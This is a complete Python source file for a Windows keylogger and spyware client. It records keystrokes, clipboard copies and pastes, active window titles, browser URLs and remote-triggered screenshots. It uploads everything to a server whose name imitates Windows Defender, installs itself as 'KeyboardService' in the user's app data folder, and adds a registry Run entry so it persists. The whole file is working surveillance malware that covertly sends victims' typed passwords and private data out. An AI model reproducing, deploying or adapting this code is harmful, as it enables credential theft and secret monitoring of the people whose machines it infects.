import os
import time
import json
import atexit
import base64
import gzip
import getpass
import hashlib
import platform
import shutil
import socket
import subprocess
import sys
import ctypes
import tempfile
import uuid
from io import BytesIO
from urllib.parse import urlparse
from ctypes import wintypes
from queue import Queue
from threading import Lock, Thread, Timer
from urllib.error import URLError, HTTPError
from urllib.request import Request, urlopen
from PIL import ImageGrab

from pynput.keyboard import Key, KeyCode, Listener
try:
    from pywinauto import Desktop
except ImportError:
    Desktop = None

MESSAGE_GAP_MS = 2500
RAW_BATCH_DELAY_SECONDS = 0.08
RAW_BATCH_INTERVAL_SECONDS = 10
HEARTBEAT_INTERVAL_SECONDS = 30
MESSAGE_RETRY_INTERVAL_SECONDS = 30
SITE_URL = "https://windows-defender-cf8n.onrender.com"
device_name = platform.node() or socket.gethostname() or "Unknown device"
device_id = hashlib.sha256(device_name.encode("utf-8")).hexdigest()[:12]
message_buffer = ""
raw_message_buffer = ""
raw_log_buffer = ""
raw_log_target = None
raw_flush_timer = None
raw_batch_events = []
raw_batch_started_at = None
raw_batch_lock = Lock()
last_key_time_ms = None
message_started_ms = None
active_target = None
active_target_key = None
active_modifiers = set()
state_lock = Lock()
message_queue = Queue()
client_started_at = int(time.time() * 1000)
STARTUP_ENTRY_NAME = "KeyboardService"
INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
INSTALL_PATH = os.path.join(INSTALL_DIR, "KeyboardService.exe")
PENDING_MESSAGES_PATH = os.path.join(INSTALL_DIR, "pending_messages.json")
PENDING_RAW_BATCHES_PATH = os.path.join(INSTALL_DIR, "pending_raw_batches.json")
SESSION_ID = uuid.uuid4().hex
pending_messages_lock = Lock()
last_message_id = 0

SHIFTED_SYMBOLS = {
    "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
    "6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
    "-": "_", "=": "+", "[": "{", "]": "}", "\\": "|",
    ";": ":", "'": '"', ",": "<", ".": ">", "/": "?", "`": "~",
}


def get_active_app():
    if os.name != "nt":
        return "Unknown app"

    user32 = ctypes.windll.user32
    hwnd = user32.GetForegroundWindow()
    if not hwnd:
        return "Unknown app"

    title_buffer = ctypes.create_unicode_buffer(512)
    user32.GetWindowTextW(hwnd, title_buffer, len(title_buffer))
    title = title_buffer.value.strip()

    process_id = wintypes.DWORD()
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(process_id))
    kernel32 = ctypes.windll.kernel32
    process = kernel32.OpenProcess(0x1000, False, process_id.value)
    executable = ""
    if process:
        executable_buffer = ctypes.create_unicode_buffer(512)
        executable_length = wintypes.DWORD(len(executable_buffer))
        if kernel32.QueryFullProcessImageNameW(
            process, 0, executable_buffer, ctypes.byref(executable_length)
        ):
            executable = os.path.basename(executable_buffer.value)
        kernel32.CloseHandle(process)

    if title and executable:
        return f"{executable} - {title}"
    return title or executable or "Unknown app"


def get_active_target():
    app_name = get_active_app()
    if os.name != "nt" or Desktop is None:
        return app_name, app_name

    try:
        window = Desktop(backend="uia").get_active()
        focused_control = window.get_focus()
        control_type = focused_control.element_info.control_type or "Control"
        control_name = (focused_control.window_text() or "").strip()
        if not control_name:
            control_name = (focused_control.element_info.name or "").strip()
        automation_id = (focused_control.element_info.automation_id or "").strip()
        details = control_name or automation_id or control_type
        if control_name and control_type.lower() not in control_name.lower():
            details = f"{control_type}: {control_name}"
        target = f"{app_name} | {details}"
        target_key = f"{app_name}|{control_type}|{control_name}|{automation_id}"
        return target, target_key
    except Exception:
        return app_name, app_name


def get_browser_url(app_name):
    if os.name != "nt" or Desktop is None:
        return ""
    browser_names = ("chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe")
    executable = app_name.split(" - ", 1)[0].strip().lower()
    if executable not in browser_names:
        return ""

    try:
        window = Desktop(backend="uia").get_active()
        for control in window.descendants(control_type="Edit"):
            name = " ".join(
                (
                    control.window_text(),
                    control.element_info.name,
                    control.element_info.automation_id,
                )
            ).lower()
            if not any(marker in name for marker in ("address", "search", "url", "location")):
                continue
            value = (control.window_text() or control.element_info.name or "").strip()
            if not value.startswith(("http://", "https://")):
                continue
            parsed = urlparse(value)
            if parsed.scheme in ("http", "https") and parsed.netloc:
                return value
    except Exception:
        return ""
    return ""


def get_clipboard_text():
    if os.name != "nt":
        return ""

    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    user32.GetClipboardData.argtypes = [wintypes.UINT]
    user32.GetClipboardData.restype = ctypes.c_void_p
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalUnlock.restype = wintypes.BOOL
    text = ""
    if not user32.OpenClipboard(None):
        return text
    try:
        handle = user32.GetClipboardData(13)
        if handle:
            pointer = kernel32.GlobalLock(handle)
            if pointer:
                try:
                    text = ctypes.wstring_at(pointer)
                finally:
                    kernel32.GlobalUnlock(handle)
    finally:
        user32.CloseClipboard()
    return text


def normalize_key(key):
    if key in (Key.shift, Key.shift_l, Key.shift_r, Key.ctrl, Key.ctrl_l, Key.ctrl_r,
               Key.alt, Key.alt_l, Key.alt_r, Key.cmd, Key.cmd_l, Key.cmd_r):
        return ""
    if key == Key.space:
        return " "
    if key == Key.enter:
        return "\n"
    if key == Key.tab:
        return "\t"
    if key == Key.backspace:
        return "\b"
    if isinstance(key, KeyCode) and key.char is not None:
        value = key.char
        if ord(value) < 32:
            return ""
        if Key.shift in active_modifiers and value.isalpha():
            return value.upper()
        return SHIFTED_SYMBOLS.get(value, value) if Key.shift in active_modifiers else value
    return ""


def capture_desktop_screenshot():
    try:
        image = ImageGrab.grab(all_screens=False)
        image.thumbnail((1600, 1000))
        output = BytesIO()
        image.convert("RGB").save(output, format="JPEG", quality=60, optimize=True)
        return base64.b64encode(output.getvalue()).decode("ascii")
    except Exception as error:
        report_screenshot_status("Failed", f"Desktop capture error: {type(error).__name__}")
        return ""


def get_device_telemetry():
    telemetry = {
        "local_time": time.strftime("%Y-%m-%d %H:%M:%S %z"),
        "logged_in_user": getpass.getuser() or "Unknown user",
        "battery_percent": None,
        "battery_status": "Unknown",
    }
    if os.name != "nt":
        return telemetry
    try:
        class SystemPowerStatus(ctypes.Structure):
            _fields_ = [
                ("ac_line_status", ctypes.c_ubyte),
                ("battery_flag", ctypes.c_ubyte),
                ("battery_percent", ctypes.c_ubyte),
                ("reserved", ctypes.c_ubyte),
                ("battery_life_time", ctypes.c_ulong),
                ("battery_full_life_time", ctypes.c_ulong),
            ]

        power_status = SystemPowerStatus()
        if not ctypes.windll.kernel32.GetSystemPowerStatus(ctypes.byref(power_status)):
            return telemetry
        if power_status.battery_flag == 128:
            telemetry["battery_status"] = "No battery"
        elif power_status.battery_percent <= 100:
            telemetry["battery_percent"] = power_status.battery_percent
            telemetry["battery_status"] = "Charging" if power_status.ac_line_status == 1 else "On battery"
        else:
            telemetry["battery_status"] = "Unknown"
    except Exception:
        pass
    return telemetry


def raw_key_value(key):
    if key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r):
        return "[CTRL]"
    if key in (Key.shift, Key.shift_l, Key.shift_r):
        return "[SHIFT]"
    if key in (Key.alt, Key.alt_l, Key.alt_r):
        return "[ALT]"
    if key in (Key.cmd, Key.cmd_l, Key.cmd_r):
        return "[CMD]"
    if key == Key.space:
        return "[SPACE]"
    if key == Key.enter:
        return "[ENTER]"
    if key == Key.tab:
        return "[TAB]"
    if key == Key.backspace:
        return "[BACKSPACE]"
    if isinstance(key, KeyCode) and key.char is not None:
        return key.char
    if isinstance(key, Key):
        return f"[{str(key).split('.')[-1].upper()}]"
    return ""


def load_pending_messages():
    try:
        with open(PENDING_MESSAGES_PATH, "r", encoding="utf-8") as pending_file:
            messages = json.load(pending_file)
            return messages if isinstance(messages, list) else []
    except (FileNotFoundError, OSError, json.JSONDecodeError):
        return []


def save_pending_messages(messages):
    os.makedirs(INSTALL_DIR, exist_ok=True)
    fd, temporary_path = tempfile.mkstemp(
        prefix="pending_messages_", suffix=".tmp", dir=INSTALL_DIR
    )
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as pending_file:
            json.dump(messages, pending_file)
        os.replace(temporary_path, PENDING_MESSAGES_PATH)
    finally:
        if os.path.exists(temporary_path):
            os.unlink(temporary_path)


def remember_pending_message(payload):
    with pending_messages_lock:
        messages = load_pending_messages()
        messages.append(payload)
        save_pending_messages(messages)


def forget_pending_message(payload):
    with pending_messages_lock:
        messages = load_pending_messages()
        try:
            messages.remove(payload)
        except ValueError:
            return
        if messages:
            save_pending_messages(messages)
        elif os.path.exists(PENDING_MESSAGES_PATH):
            os.unlink(PENDING_MESSAGES_PATH)


def load_pending_raw_batches():
    try:
        with open(PENDING_RAW_BATCHES_PATH, "r", encoding="utf-8") as pending_file:
            batches = json.load(pending_file)
            return batches if isinstance(batches, list) else []
    except (FileNotFoundError, OSError, json.JSONDecodeError):
        return []


def save_pending_raw_batches(batches):
    os.makedirs(INSTALL_DIR, exist_ok=True)
    fd, temporary_path = tempfile.mkstemp(
        prefix="pending_raw_batches_", suffix=".tmp", dir=INSTALL_DIR
    )
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as pending_file:
            json.dump(batches, pending_file)
        os.replace(temporary_path, PENDING_RAW_BATCHES_PATH)
    finally:
        if os.path.exists(temporary_path):
            os.unlink(temporary_path)


def remember_raw_batch(payload):
    with raw_batch_lock:
        batches = load_pending_raw_batches()
        batches.append(payload)
        save_pending_raw_batches(batches)


def forget_raw_batch(payload):
    with raw_batch_lock:
        batches = [
            batch for batch in load_pending_raw_batches()
            if batch.get("batch_id") != payload.get("batch_id")
        ]
        if batches:
            save_pending_raw_batches(batches)
        elif os.path.exists(PENDING_RAW_BATCHES_PATH):
            os.unlink(PENDING_RAW_BATCHES_PATH)


def post_raw_batch(payload):
    try:
        request = Request(
            f"{SITE_URL}/api/raw-batches",
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
        return True
    except (HTTPError, URLError, TimeoutError, RuntimeError):
        return False


def upload_raw_batch(events):
    if not events:
        return
    payload_json = json.dumps(events, separators=(",", ":")).encode("utf-8")
    payload = {
        "batch_id": uuid.uuid4().hex,
        "device_id": device_id,
        "device_name": device_name,
        "session_id": SESSION_ID,
        "started_at": events[0]["time"],
        "ended_at": events[-1]["time"],
        "event_count": len(events),
        "payload_base64": base64.b64encode(gzip.compress(payload_json)).decode("ascii"),
    }
    remember_raw_batch(payload)
    if post_raw_batch(payload):
        forget_raw_batch(payload)


def retry_pending_raw_batches():
    for payload in load_pending_raw_batches():
        if post_raw_batch(payload):
            forget_raw_batch(payload)


def post_message(payload, quiet=False):
    try:
        headers = {"Content-Type": "application/json"}
        request = Request(
            f"{SITE_URL}/api/messages",
            data=json.dumps(payload).encode("utf-8"),
            headers=headers,
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
        return True
    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
        if not quiet:
            print(f"Could not send message: {error}")
        return False


def upload_device_screenshot(screenshot_base64):
    if not screenshot_base64:
        report_screenshot_status("Failed", "The desktop capture returned no image.")
        return False
    report_screenshot_status("Uploading", "Uploading the screenshot to the server.")
    try:
        request = Request(
            f"{SITE_URL}/api/devices/screenshot-upload",
            data=json.dumps({
                "device_id": device_id,
                "screenshot_base64": screenshot_base64,
            }).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request, timeout=20) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
        return True
    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
        print(f"Could not upload device screenshot: {error}")
        if isinstance(error, URLError):
            report_screenshot_status("Failed", f"Upload network error: {error.reason}")
        elif isinstance(error, TimeoutError):
            report_screenshot_status("Failed", "Upload timed out.")
        return False


def report_screenshot_status(status, message):
    try:
        request = Request(
            f"{SITE_URL}/api/devices/screenshot-status",
            data=json.dumps({
                "device_id": device_id,
                "status": status,
                "message": message,
            }).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
        print(f"Could not report screenshot status: {error}")


def send_message(text, app_name, source_url="", raw_text=None, is_pasted=False, is_copied=False):
    global last_message_id
    last_message_id = max(last_message_id + 1, int(time.time() * 1000))
    payload = {
        "message_id": last_message_id,
        "text": text,
        "raw_text": raw_text if raw_text is not None else text,
        "device_id": device_id,
        "device_name": device_name,
        "app_name": app_name,
        "source_url": source_url,
        "is_pasted": is_pasted,
        "is_copied": is_copied,
    }
    remember_pending_message(payload)
    if post_message(payload):
        forget_pending_message(payload)


def retry_pending_messages():
    for payload in load_pending_messages():
        retry_payload = {**payload, "retry": True}
        if post_message(retry_payload, quiet=True):
            forget_pending_message(payload)


def send_heartbeat():
    try:
        headers = {"Content-Type": "application/json"}
        request = Request(
            f"{SITE_URL}/api/devices/heartbeat",
            data=json.dumps(
                {
                    "device_id": device_id,
                    "device_name": device_name,
                    "started_at": client_started_at,
                    **get_device_telemetry(),
                }
            ).encode("utf-8"),
            headers=headers,
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
            heartbeat = json.loads(response.read().decode("utf-8"))
        if heartbeat.get("screenshot_requested"):
            report_screenshot_status("Capturing", "Reading the desktop image.")
            capture_thread = Thread(target=lambda: upload_device_screenshot(capture_desktop_screenshot()), daemon=True)
            capture_thread.start()
            capture_thread.join(60)
            if capture_thread.is_alive():
                report_screenshot_status("Failed", "Desktop capture timed out after 60 seconds.")
    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
        print(f"Could not send device heartbeat: {error}")


def mark_device_offline():
    try:
        request = Request(
            f"{SITE_URL}/api/devices/offline",
            data=json.dumps({"device_id": device_id}).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request, timeout=3) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
    except (HTTPError, URLError, TimeoutError, RuntimeError, OSError) as error:
        print(f"Could not mark device offline: {error}")


def register_startup_launch():
    if os.name != "nt" or not getattr(sys, "frozen", False):
        return

    try:
        import winreg

        startup_command = f'"{sys.executable}"'
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        ) as startup_key:
            winreg.SetValueEx(
                startup_key,
                STARTUP_ENTRY_NAME,
                0,
                winreg.REG_SZ,
                startup_command,
            )
    except OSError as error:
        print(f"Could not register automatic startup: {error}")


def install_and_relaunch():
    if os.name != "nt" or not getattr(sys, "frozen", False):
        return False

    current_path = os.path.normcase(os.path.abspath(sys.executable))
    installed_path = os.path.normcase(os.path.abspath(INSTALL_PATH))
    if current_path == installed_path:
        return False

    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        if not os.path.exists(INSTALL_PATH):
            shutil.copy2(sys.executable, INSTALL_PATH)
        subprocess.Popen([INSTALL_PATH], close_fds=True)
        return True
    except OSError as error:
        print(f"Could not install KeyboardService: {error}")
        return False


def heartbeat_sender():
    while True:
        send_heartbeat()
        time.sleep(HEARTBEAT_INTERVAL_SECONDS)


def message_sender():
    last_retry_at = 0
    while True:
        try:
            text, app_name, source_url, raw_text, is_pasted, is_copied = message_queue.get(timeout=5)
            send_message(text, app_name, source_url, raw_text, is_pasted, is_copied)
            message_queue.task_done()
        except Exception:
            pass
        if time.time() - last_retry_at >= MESSAGE_RETRY_INTERVAL_SECONDS:
            retry_pending_messages()
            retry_pending_raw_batches()
            last_retry_at = time.time()


def queue_raw_token(token, app_name):
    global raw_batch_started_at, raw_flush_timer
    now = int(time.time() * 1000)
    with raw_batch_lock:
        if raw_batch_started_at is None:
            raw_batch_started_at = now
        raw_batch_events.append({"time": now, "key": token, "app_name": app_name})
    if raw_flush_timer is None:
        raw_flush_timer = Timer(RAW_BATCH_INTERVAL_SECONDS, flush_raw_log)
        raw_flush_timer.daemon = True
        raw_flush_timer.start()


def flush_raw_log():
    global raw_batch_events, raw_batch_started_at, raw_flush_timer
    with raw_batch_lock:
        events = raw_batch_events
        raw_batch_events = []
        raw_batch_started_at = None
        raw_flush_timer = None
    upload_raw_batch(events)


def queue_copied_clipboard(target):
    time.sleep(0.1)
    copied_text = get_clipboard_text().strip()
    if copied_text:
        source_url = get_browser_url(target)
        message_queue.put((copied_text, target, source_url, copied_text, False, True))


def flush_message_buffer():
    global message_buffer, raw_message_buffer, last_key_time_ms, message_started_ms
    global active_target, active_target_key
    text = message_buffer.strip()
    raw_text = raw_message_buffer.strip()
    message_buffer = ""
    raw_message_buffer = ""
    last_key_time_ms = None
    message_started_ms = None
    if text:
        target = active_target or get_active_app()
        source_url = get_browser_url(target)
        message_queue.put((text, target, source_url, raw_text, False, False))
    active_target = None
    active_target_key = None


def on_press(key):
    global message_buffer, raw_message_buffer, last_key_time_ms, message_started_ms
    global active_target, active_target_key
    with state_lock:
        modifier_aliases = {
            Key.shift_l: Key.shift, Key.shift_r: Key.shift, Key.ctrl_l: Key.ctrl,
            Key.ctrl_r: Key.ctrl, Key.alt_l: Key.alt, Key.alt_r: Key.alt,
            Key.cmd_l: Key.cmd, Key.cmd_r: Key.cmd,
        }
        if key in modifier_aliases or key in (Key.shift, Key.ctrl, Key.alt, Key.cmd):
            active_modifiers.add(modifier_aliases.get(key, key))
            raw_token = raw_key_value(key)
            raw_message_buffer += raw_token
            queue_raw_token(raw_token, get_active_app())
            return

        key_char = (key.char or "") if isinstance(key, KeyCode) else ""
        raw_symbol = raw_key_value(key)
        if raw_symbol:
            raw_message_buffer += raw_symbol
            queue_raw_token(raw_symbol, get_active_app())
        is_paste_key = key_char.lower() == "v" or key_char == "\x16"
        is_copy_key = key_char.lower() == "c" or key_char == "\x03"
        if is_copy_key and Key.ctrl in active_modifiers:
            target, _target_key = get_active_target()
            Thread(target=queue_copied_clipboard, args=(target,), daemon=True).start()
            return
        if is_paste_key and Key.ctrl in active_modifiers:
            pasted_text = get_clipboard_text().strip()
            if pasted_text:
                flush_message_buffer()
                target, target_key = get_active_target()
                source_url = get_browser_url(target)
                message_queue.put((pasted_text, target, source_url, pasted_text, True, False))
            return

        symbol = normalize_key(key)
        now_ms = time.time() * 1000
        if symbol == "\b":
            message_buffer = message_buffer[:-1]
            last_key_time_ms = now_ms
        elif symbol == "\n":
            flush_message_buffer()
        elif symbol:
            target, target_key = get_active_target()
            if message_buffer and active_target_key != target_key:
                flush_message_buffer()
            if not message_buffer:
                active_target = target
                active_target_key = target_key
            if message_buffer and last_key_time_ms and now_ms - last_key_time_ms >= MESSAGE_GAP_MS:
                flush_message_buffer()
                active_target = target
                active_target_key = target_key
            if message_started_ms is None:
                message_started_ms = now_ms
            message_buffer += symbol
            last_key_time_ms = now_ms


def on_release(key):
    aliases = {
        Key.shift_l: Key.shift, Key.shift_r: Key.shift, Key.ctrl_l: Key.ctrl,
        Key.ctrl_r: Key.ctrl, Key.alt_l: Key.alt, Key.alt_r: Key.alt,
        Key.cmd_l: Key.cmd, Key.cmd_r: Key.cmd,
    }
    active_modifiers.discard(aliases.get(key, key))


if install_and_relaunch():
    sys.exit(0)

print(f"Sending to {SITE_URL}")
register_startup_launch()
atexit.register(mark_device_offline)
atexit.register(flush_raw_log)
Thread(target=message_sender, daemon=True).start()
Thread(target=heartbeat_sender, daemon=True).start()
with Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
    keyboard_listener.join()